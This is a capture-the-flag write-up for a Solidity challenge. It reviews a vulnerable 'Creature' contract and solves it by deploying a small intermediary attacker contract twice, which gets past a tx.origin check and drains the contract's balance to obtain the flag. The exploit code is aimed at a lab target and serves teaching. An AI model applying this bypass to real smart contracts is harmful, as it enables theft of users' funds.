# Survival of the Fittest

### CHALLENGE DESCRIPTION
**_After defeating her first monster, Alex stood frozen, staring up at another massive, hulking creature that loomed over her. She knew that this was a fight she couldn't win on her own. She turned to her guildmates, trying to come up with a plan. "We need to distract it," Alex said. "If we can get it off balance, we might be able to take it down." Her guildmates nodded, their eyes narrowed in determination. They quickly came up with a plan to lure the monster away from their position, using a combination of noise and movement to distract it. As they put their plan into action, Alex drew her sword and waited for her chance._**

## Solution

**STEP 1: Code reviewing**

There we have 2 Solidity files similar to `Survival of the Fittest` codes:

>**`Setup.sol`**

```
// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.13;

import {Creature} from "./Creature.sol";

contract Setup {
    Creature public immutable TARGET;

    constructor() payable {
        require(msg.value == 1 ether);
        TARGET = new Creature{value: 10}();
    }

    function isSolved() public view returns (bool) {
        return address(TARGET).balance == 0;
    }
}
```

>**`Creature.sol`**

```
// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.13;

contract Creature {
    uint256 public lifePoints;
    address public aggro;

    constructor() payable {
        lifePoints = 1000;
    }

    function attack(uint256 _damage) external {
        if (aggro == address(0)) {
            aggro = msg.sender;
        }

        if (_isOffBalance() && aggro != msg.sender) {
            lifePoints -= _damage;
        } else {
            lifePoints -= 0;
        }
    }

    function loot() external {
        require(lifePoints == 0, "Creature is still alive!");
        payable(msg.sender).transfer(address(this).balance);
    }

    function _isOffBalance() private view returns (bool) {
        return tx.origin != msg.sender;
    }
}
```

Here you can see some differences from the `Survival of the Fittest` files, such as `_isOffBalance()` and `aggro`. To kill the enemy, we need to bypass these conditions.


**STEP 2: The Bypass**

Take a look to the `_isOffBalance()` function

```
function _isOffBalance() private view returns (bool) {
    return tx.origin != msg.sender;
}
```

Let`s deploy a contract to avoid this.

>**`Creature.sol`**

```
// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.13;

interface ICreature {
    function attack(uint256 _damage) external;
}

contract Attacker {
    ICreature target;

    constructor(address _target) {
        target = ICreature(_target);
    }

    function attack(uint256 _damage) external {
        target.attack(_damage);
    }
}
```

We need to deploy it twice to distract enemy.

First deploy:

![image](https://github.com/luvranse/web3/assets/46570641/8094ec25-7c85-4e43-9ebf-96ddf53df1cf)

Second deploy:

![image](https://github.com/luvranse/web3/assets/46570641/80ce8c85-ee18-4b7d-80f4-a17646138850)

**STEP 3: The Battle**

Initiate an attack with one of our contracts. Distract the enemy.

![image](https://github.com/luvranse/web3/assets/46570641/b67668e1-8f2d-4894-b2d4-0289fa67f46a)

Then attack with another one. 

![image](https://github.com/luvranse/web3/assets/46570641/95349e4f-b63d-4c21-881e-cbd3ef07347e)

Let's try take a loot. 

![image](https://github.com/luvranse/web3/assets/46570641/ceeb051f-df34-4037-82b2-f2f2f13a352f)

Congratz! There is the flag!

![image](https://github.com/luvranse/web3/assets/46570641/f1a06966-e9fd-4dab-8799-a75c92da167f)

### FLAG

```
HTB{tx.0r1gin_c4n_74k3_d0wn_4_m0n5732}
```

